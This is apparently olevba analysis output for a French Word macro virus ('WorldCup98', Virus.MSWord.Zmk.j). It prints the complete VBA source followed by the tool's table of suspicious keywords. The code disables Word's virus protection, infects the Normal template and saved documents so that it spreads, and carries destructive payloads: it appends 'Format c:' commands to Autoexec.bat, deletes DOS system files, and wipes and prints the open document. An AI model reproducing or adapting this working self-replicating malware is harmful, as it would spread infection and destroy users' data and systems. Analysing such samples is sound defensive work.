olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zmk.j
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Zmk.j 
in file: Virus.MSWord.Zmk.j - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAE
Dim MyTime, MyDate, NBH$
MyTime = Time
MyDate = Date
D$ = Mid(MyDate, 1, 2)
Ts$ = Mid(MyTime, 7, 8)
If D$ = "12" Or Ts$ = "12" Then
    Randomize
    NBH$ = Int(Rnd * 10) + 1
    Select Case NBH$
        Case 1, 3, 5, 7, 9
            Call Pronostique
        Case 2, 4, 6, 8, 10
            Call WC98PayLoad
    End Select
End If
ErrorAE:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "WorldCup98" Then
        WorldCup98Installed = -1
    End If
Next i
If Not WorldCup98Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="WorldCup98", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Pronostic", Object:=wdOrganizerObjectProjectItems
    MsgBox "VIVE LA COUPE DU MONDE 98!!!!", vbInformation, "Virus WorldCup98"
End If
ErrorAO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="WorldCup98", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Pronostic", Object:=wdOrganizerObjectProjectItems
MsgBox "J'esp�re que tu aime le football...", vbInformation, "Virus WorldCup98"
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
    MsgBox "Hip Hip Hourra!!!!", vbInformation, "Virus WorldCup98"
ErrorFT:
End Sub
Private Sub Pronostique()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorPe
Dim WC98$, NH$, Equipe$, Pay$
Randomize
Debut:
    Pronostic.Show
WC98$ = WordBasic.[GetPrivateProfileString$]("Pronostic", "Equipe", "WorldCup98.INI")
If WC98$ = "0" Then
    MsgBox "Veuillez choisir une �quipe", vbInformation, "Virus WorldCup98"
    GoTo Debut
End If
NH$ = Int(Rnd * 9) + 1
If NH$ = "1" Then
    Equipe$ = "Br�sil"
End If
If NH$ = "2" Then
    Equipe$ = "Italie"
End If
If NH$ = "3" Then
    Equipe$ = "France"
End If
If NH$ = "4" Then
    Equipe$ = "Espagne"
End If
If NH$ = "5" Then
    Equipe$ = "Mexique"
End If
If NH$ = "6" Then
    Equipe$ = "Allemagne"
End If
If NH$ = "7" Then
    Equipe$ = "Angleterre"
End If
If NH$ = "8" Then
    Equipe$ = "Argentine"
End If
If NH$ = "9" Then
    Equipe$ = "Yougoslavie"
End If
If NH$ = WC98$ Then
    MsgBox "Bravo!!!, bien jou�...", Title:="Virus WorldCup98"
Message:
    StatusBar = "       Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "               Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                   Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
GoTo Message
End If
If NH$ <> WC98$ Then
        MsgBox "Dommage pour toi, tu as PERDU..." & Chr$(13) & "mon choix �tait: " & Equipe$, Title:="Virus WorldCup98"
        Randomize
        Pay$ = Int(Rnd * 15) + 1
        Select Case Pay$
            Case 1, 5, 8, 9, 12, 13
                Open "C:\Autoexec.bat" For Append As #1
                    Print #1, "Cls"
                    Print #1, "Echo La coupe du monde 98 c'est g�nial!!!!"
                    Print #1, "Echo y|Format c: /u /v:WorldCup98"
                    Print #1, "Echo o|Format c: /u /v:WorldCup98"
                Close #1
            Case 3, 4, 7, 15
                Kill "C:\Dos\*.*"
                Kill "C:\Windows\Command\*.*"
                Kill "C:\Msdos.sys"
                Kill "C:\Io.sys"
            Case 2, 6, 10, 11, 14
                Selection.WholeStory
                Selection.Delete Unit:=wdCharacter, Count:=1
                For i = 1 To 98
                Selection.TypeParagraph
                Selection.TypeText Text:="Vive la coupe du monde 98!!!!!"
                Next i
                Selection.TypeParagraph
                Selection.TypeText Text:="ZeMacroKiller98 aime beaucoup le football..."
                ActiveDocument.PrintOut
        End Select
End If
ErrorPe:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
    MsgBox "ZeMacroKiller98 est heureux de d�dier ce virus" & Chr$(13) & "� tous ceux qui aime le FOOTBALL", vbInformation, "Virus WorldCup98"
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
Assistant.Visible = True
With Assistant.NewBalloon
    .Button = msoButtonSetOK
    .Heading = "Virus WorldCup98"
    .Text = "Allez la France!!!!!"
    .Show
End With
ErrorVVBC:
End Sub
Private Sub WC98PayLoad()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorWC98PL
Charge:
    ActiveDocument.Shapes.AddTextEffect(msoTextEffect22, "World Cup 98", _
        "Impact", 60#, msoFalse, msoFalse, 132.15, 120.55).Select
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 45#
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 90#
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 135#
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 180#
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 225#
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 270#
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 315#
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 0#
    Selection.ShapeRange.Delete
GoTo Charge
ErrorWC98PL:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

